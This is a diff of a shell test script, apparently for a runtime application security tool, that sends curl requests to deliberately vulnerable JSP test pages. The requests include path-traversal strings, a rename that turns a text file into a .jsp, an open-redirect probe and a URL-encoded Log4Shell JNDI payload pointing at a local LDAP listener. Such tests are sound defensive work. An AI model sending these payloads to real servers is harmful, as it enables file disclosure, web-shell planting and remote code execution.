@@ -78,3 +78,6 @@ curl "$HOST/vulns/021-nio-file.jsp?dirname=../../../../../../../../../../../../.
 curl "$HOST/vulns/021-nio-file.jsp?dirname=../../../&mode=list"
 curl "$HOST/vulns/021-nio-file.jsp?filename=rename.txt&dst=rename.log&mode=rename"
 curl "$HOST/vulns/021-nio-file.jsp?filename=reports/../rename.txt&dst=reports/../rename.jsp&mode=rename"
+curl "$HOST/vulns/013-multipart-mysql.jsp" -X POST -H "Content-Type: multipart/form-data; boundary=---------------------------278669071441892235912495224969" --data-binary $"-----------------------------278669071441892235912495224969\r\nContent-Disposition: form-data; name='id'\r\n\r\nfoo\r\n-----------------------------278669071441892235912495224969--\r\n"
+curl "$HOST/vulns/023-url-redirection.jsp?url=/vulns/023-url-redirection.jsp"
+curl "$HOST/vulns/022-log4j.jsp?log=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%33%38%39%2f%61%7d"
